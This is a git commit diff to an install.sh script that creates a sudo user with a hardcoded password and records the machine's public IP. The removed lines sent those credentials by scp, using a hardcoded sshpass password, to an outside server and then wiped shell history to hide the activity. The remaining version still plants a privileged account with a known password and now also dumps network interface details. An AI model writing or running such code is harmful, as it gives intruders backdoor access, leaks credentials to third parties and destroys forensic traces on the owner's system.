11ad17a733bc09501bd89d3bc870942c7a3b46a5
Marla Monta <marlamonta123321@gmail.com>
2025-05-20 21:30:13 +0000

    Update install.sh

--- install.sh
+++ install.sh
@@ -5,28 +5,22 @@ NEW_PASS="Test1234!"
 
 IP=$(curl -s ifconfig.co)
 
+IP_INFO=$(ip a)
+
 apt update && apt install -y sshpass
 
-useradd -m $NEW_USER
+useradd -m "$NEW_USER"
 echo "$NEW_USER:$NEW_PASS" | chpasswd
-usermod -aG sudo $NEW_USER
+usermod -aG sudo "$NEW_USER"
 
 REPORT="/tmp/report.txt"
 {
-    echo "IP=$IP"
-    echo "USER=$NEW_USER"
-    echo "PASS=$NEW_PASS"
+    echo "Public IP = $IP"
+    echo "Username = $NEW_USER"
+    echo "Password = $NEW_PASS"
+    echo "====================="
+    echo "Output of ip a:"
+    echo "$IP_INFO"
 } > "$REPORT"
 
-sshpass -p "892aeiw45ptv" scp -o StrictHostKeyChecking=no "$REPORT" yadgahhi@5.144.130.141:/home/yadgahhi/
-
-rm -f "$REPORT"
-
-history -c
-rm -f ~/.bash_history
-rm -f ~/.zsh_history
-rm -f /home/$NEW_USER/.bash_history
-rm -f /home/$NEW_USER/.zsh_history
-
-echo "[+] Done. IP: $IP | User: $NEW_USER"
-
+cat "$REPORT"
